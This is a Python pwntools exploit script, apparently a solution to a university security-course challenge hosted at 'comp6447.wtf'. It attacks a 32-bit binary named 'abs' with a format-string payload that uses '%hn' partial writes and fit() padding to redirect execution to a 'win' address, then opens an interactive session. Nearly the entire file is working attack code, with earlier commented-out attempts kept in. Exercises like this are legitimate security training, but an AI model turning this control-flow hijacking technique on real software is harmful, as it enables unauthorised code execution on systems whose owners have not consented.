#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './abs' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 29694 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
win = p32(0x80491d6)
index = 123*24
address = p32(0x804c1c0)
# GOT @ %50x @ 804c000
# main @ %55x 
payload = b'127'
#partial_win = 0x91d6-len(payload)
#payload += f'%{partial_win}x%55$hn'.encode()
#payload += cyclic(3000)
#eax_offset = cyclic_find("abdk")
# eax @ dnab
#eax_offset = cyclic_find("dnab")

#log.info(f"eax change at input: {eax_offset}")
#index_offset = index - len(payload)
#payload += fit({
#    3: b"%x "*950,
#    eax_offset: address,
#    index_offset: win*6
#})
#=======================================
partial_overwrite = 0x91d6 - len(payload)
payload += f"%{partial_overwrite}x%1$hn".encode()
offset = index - len(payload)
payload += fit({
    0: b"%x "*100,
    offset: address,
    offset + 4: 0x804c020
})
p.recvuntil(b"[0-3]: ", drop=True)
p.sendline(payload)

p.interactive()

